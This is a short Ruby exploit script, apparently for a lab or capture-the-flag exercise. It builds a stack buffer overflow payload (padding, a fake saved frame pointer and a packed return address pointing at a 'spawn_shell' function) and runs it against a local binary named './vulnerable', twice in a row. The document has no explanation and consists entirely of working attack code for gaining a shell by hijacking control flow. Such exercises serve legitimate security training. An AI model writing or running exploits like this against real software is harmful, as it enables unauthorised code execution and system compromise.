
require 'open3'

binary = "./vulnerable"
spawn_shell_addr = 0x8049196
offset = 76

padding = "A" * 72
saved_ebp = "BBBB"
return_address = [spawn_shell_addr].pack("V")

payload = padding + saved_ebp + return_address

puts "Payload length: #{payload.length} bytes"
puts "Executing exploit..."

begin
  stdout, stderr, status = Open3.capture3(binary, payload)
  puts stdout
  puts stderr if !stderr.empty?
rescue => e
  puts "Error: #{e.message}"
end

system(binary, payload)